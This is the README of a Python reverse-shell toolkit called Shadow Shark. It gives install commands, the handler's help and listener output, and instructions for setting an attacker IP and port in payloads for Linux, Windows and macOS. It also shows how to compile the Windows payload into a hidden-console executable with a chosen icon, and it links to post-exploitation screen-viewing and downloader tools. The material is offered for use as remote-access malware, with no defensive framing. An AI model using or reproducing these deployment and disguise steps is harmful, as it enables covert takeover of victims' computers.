# Shadow Shark Reverse Shell 
A full fledged reverse TCP payload written in pure python3.

## Installation
### Debian
```
$ sudo apt-get install python3 git
$ cd /opt/
$ sudo git clone https://github.com/MrSharkSpamBot/ShadowSharkReverseShell.git
$ cd ShadowSharkReverseShell/
$ sudo chmod +x ShadowShark
$ sudo cp ShadowShark /usr/bin/
```
### Arch
```
$ sudo pacman -S python git
$ cd /opt/
$ sudo git clone https://github.com/MrSharkSpamBot/ShadowSharkReverseShell.git
$ cd ShadowSharkReverseShell/
$ sudo chmod +x ShadowShark
$ sudo cp ShadowShark /usr/bin/
```

## Usage
### ShadowShark.py
```
$ ShadowShark --help

	                                             ``
	                                       ``-+yhh-
	                                    `:ohNMMMy.                  `.-`
	                                `-ohNMMMMMM:                `.+hNy-
	             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
	      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
	  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
	`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
	 :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
	  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
	  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
	  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
	   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
	       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
	             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
	                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
	                                     `mMMMMMMM``````````````.sNMMh
	                                      -mMMMMMM.               .smMy`
	                                       .yMMMMMh`                `:ys.
	                                         :yNMMMh.
	                                           .odNMm:
	                                             `-/sh:
    
usage: ShadowShark.py [-h] -lh LHOST -lp LPORT -e ENCRYPTION

This tool is a full fledged reverse TCP handler used to interact with Shadow
Shark payloads. Created by Mr. Shark Spam Bot.

optional arguments:
  -h, --help            show this help message and exit
  -lh LHOST, --lhost LHOST
                        Your IP address.
  -lp LPORT, --lport LPORT
                        The port to listen for connections on.
  -e ENCRYPTION, --encryption ENCRYPTION
                        The encryption used for sent and recieved data.
$ ShadowShark --lhost 0.0.0.0 --lport 8080 --encryption hex

	                                             ``
	                                       ``-+yhh-
	                                    `:ohNMMMy.                  `.-`
	                                `-ohNMMMMMM:                `.+hNy-
	             ``.-:+osyyyhhhhhdddmMMMMMMMMMm---:::--..``````+dMMMo
	      `:+syhdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMo/-`                          ./o+
	  `+ymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMms:`                 `:ohNMd:
	`oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMdo-          -+ymMMMMy-
	 :NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/`  .+hNMMMMMNo.
	  `/+shdmymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNhmMMMMMMMNo`
	  osdhdosydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNo`
	  sdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd/`
	   ``:shNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy/.
	       ``./ohdNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNdhhdmNMMMMMMNd+.
	             ``.-:/+osyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNdhs+-`` ````.:+yhmNMMNh+.
	                       ```.-:/+syyyhhdMMMMMMMMddddddddddddddNMMMMdo/:...``               ```.-/oys:
	                                     `mMMMMMMM``````````````.sNMMh
	                                      -mMMMMMM.               .smMy`
	                                       .yMMMMMh`                `:ys.
	                                         :yNMMMh.
	                                           .odNMm:
	                                             `-/sh:
    
[*] A reverse TCP handler on 0.0.0.0:8080 has successfully started...
```
### ShadowSharkPayload.py
This payload can run on Linux, Windows, and MacOS. To configure the payload go to line 29 and replace IP with your IP and replace PORT with the port on your computer you want connections be sent to and from.
### UnixPayload.py
This payload can run on any Unix based system. To configure the payload go to line 35 and replace IP with your IP and replace PORT with the port on your computer you want connections be sent to and from.
### WindowsPayload.py
This payload can run on any Windows system. To configure the payload go to line 29 and replace IP with your IP and replace PORT with the port on your computer you want connections be sent to and from.
### Compile.py
This compilation script can only be run on a Windows computer or Wine environment. To configure the compilation script go to line 14 and replace ICON with the icon file you want your exe file to have to have. To do this make sure that the ShadowSharkPayload.py script, your icon file, and the Compile.py script are in the same folder and that py2exe is installed.
```
# First install python3 on your Windows computer or Wine environment.
$ pip install py2exe
$ python Compile.py py2exe
```
### Alternative compilation
```
# First install python3 on your Windows computer or Wine environment.
$ pip install nuitka zstandard
$ nuitka --windows-disable-console --windows-icon-from-ico=icon.ico --onefile WindowsPayload.py
```

## Post Exploitation
<a href="https://github.com/BababooeyHackers/ScreenView">Screen View</a>
<a href="https://github.com/BababooeyHackers/Downloader">Downloader</a>
